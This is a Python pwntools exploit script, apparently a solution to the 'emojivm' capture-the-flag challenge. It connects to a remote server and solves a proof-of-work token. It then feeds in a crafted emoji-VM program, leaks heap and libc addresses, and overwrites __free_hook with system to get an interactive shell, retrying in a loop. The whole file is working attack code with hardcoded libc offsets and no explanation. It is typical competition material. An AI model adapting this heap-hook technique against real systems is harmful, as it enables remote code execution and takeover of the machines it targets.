from pwn import *
# context.log_level = 'debug'

TARGET = './emojivm'
HOST = '3.115.176.164'
PORT = 30262

# r = process([TARGET, "HOGE"])
# r = process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})

elf = ELF(TARGET)


def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))


def exploit(r):
    r.recvuntil('token:\n')
    s = r.recvuntil('\n')[:-1]

    sh = process('/bin/sh')
    sh.sendline(s) 
    res = sh.recv().split('token: ')[1][:-1]
    sh.close()

    emo = open('./AAAA').readline()
    r.sendline(res)
    r.sendlineafter('( MAX: 1000 bytes )', str(len(emo[:-1])))
    r.sendafter('file:', emo[:-1]) 
    r.recvuntil('\n')
    
    r.sendline('')
    sleep(0.1)
    heap_leak = int(r.recv(0xe))
    # dbg("heap_leak")
    print "heap:", hex(heap_leak)
    assert heap_leak & 0x80000000 == 0
    
    libc_leak = u64(r.recv(4).rjust(8, '\x00'), endian="big")*0x100+0x49+0x7f0000000000
    # dbg("libc_leak")

    libc_base = libc_leak - (0x7f0d7d080949-0x00007f0d7cecd000)
    # dbg("libc_base")
    print "libc:", hex(libc_base)
    system = libc_base + 0x4f440
    free_hook = libc_base + 0x3ed8e8
    # r.sendline(p64(leak+0x2200))
    # r.recv(2)
    sleep(0.1)
    r.send(p64(free_hook).ljust(0x20, '\x00'))
    sleep(0.1)
    r.send(p64(system).ljust(0x20, '\x00'))
    sleep(0.1)
    r.send("/bin/sh".ljust(0x20, '\x00'))

    r.interactive()
    r.close()
    exit()

while(1):
    # r = process([TARGET, "AAAA"])
    r = remote(HOST, PORT)
    # gdb.attach(r, 'c')
    # pause()
    try:
        exploit(r)
    except:
        r.close()
